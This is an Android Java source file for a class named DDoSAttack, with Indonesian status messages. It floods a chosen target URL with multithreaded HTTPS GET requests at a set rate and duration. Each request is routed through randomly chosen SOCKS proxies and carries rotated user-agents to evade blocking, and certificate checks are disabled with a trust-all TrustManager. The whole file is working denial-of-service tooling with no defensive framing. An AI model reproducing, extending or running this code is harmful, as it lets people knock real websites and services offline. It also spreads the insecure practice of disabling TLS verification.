package xxx;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.widget.Toast;

import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;
import javax.net.ssl.*;
import java.security.cert.X509Certificate;
import java.security.NoSuchAlgorithmException;
import java.security.KeyManagementException;

public class DDoSAttack {

    private Context context;
    private String targetUrl;
    private int time;
    private int rate;
    private int threads;
    private List<String> userAgents;
    private List<String> proxies;
    private boolean isAttacking = false; 

    public DDoSAttack(Context context, String targetUrl, int time, int rate, int threads, List<String> userAgents, List<String> proxies) {
        this.context = context;
        this.targetUrl = targetUrl;
        this.time = time;
        this.rate = rate;
        this.threads = threads;
        this.userAgents = userAgents;
        this.proxies = proxies;
    }

    public void startAttack() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    showToast("Memulai serangan DDoS...");                  
                    showToast("Serangan DDoS selesai.");
                    isAttacking = true; 

                    URL targetUrlObj = new URL(targetUrl);
                    final String host = targetUrlObj.getHost();
                    final String path = targetUrlObj.getPath();

                    ExecutorService executor = Executors.newFixedThreadPool(threads);

                    for (int i = 0; i < threads; i++) {
                        executor.submit(new Runnable() {
                            @Override
                            public void run() {
                                while (isAttacking) { 
                                    try {
                                        sendRequest(proxies, userAgents, host, path);
                                        Thread.sleep(1000 / rate); 
                                    } catch (InterruptedException e) {
                                        Thread.currentThread().interrupt();
                                    }
                                }
                            }
                        });
                    }

                    Thread.sleep(time * 1000);
                    stopAttack(); 
                    executor.shutdownNow(); 

                } catch (IOException | InterruptedException e) {
                    showToast("Error: " + e.getMessage());
                }
            }
        }).start();
    }

    public void stopAttack() {
        isAttacking = false; 
        showToast("Serangan dihentikan.");
    }

    private void sendRequest(List<String> proxies, List<String> userAgents, String host, String path) {
        try {
            String proxyAddr = getRandomElement(proxies);
            String[] proxyParts = proxyAddr.split(":");
            String proxyHost = proxyParts[0];
            int proxyPort = Integer.parseInt(proxyParts[1]);

            Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress(proxyHost, proxyPort));

            HttpsURLConnection connection = (HttpsURLConnection) new URL("https://" + host + path).openConnection(proxy);
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", getRandomElement(userAgents));
            connection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            connection.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
            connection.setRequestProperty("Connection", "Keep-Alive");
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);

            TrustManager[] trustAllCertificates = new TrustManager[]{
                new X509TrustManager() {
                    public X509Certificate[] getAcceptedIssuers() {
                        return null;
                    }

                    public void checkClientTrusted(X509Certificate[] certs, String authType) {
                    }

                    public void checkServerTrusted(X509Certificate[] certs, String authType) {
                    }
                }
            };

            SSLContext sslContext = SSLContext.getInstance("TLS");
            sslContext.init(null, trustAllCertificates, new java.security.SecureRandom());
            connection.setSSLSocketFactory(sslContext.getSocketFactory());

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                showToast("Request berhasil: " + responseCode);
            } else {
                showToast("Request gagal: " + responseCode);
            }

            connection.disconnect();
        } catch (IOException | NoSuchAlgorithmException | KeyManagementException e) {
            showToast("Error mengirim request: " + e.getMessage());
        }
    }

    private String getRandomElement(List<String> list) {
        Random random = new Random();
        return list.get(random.nextInt(list.size()));
    }

    private void showToast(final String message) {
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
            }
        });
    }
          }
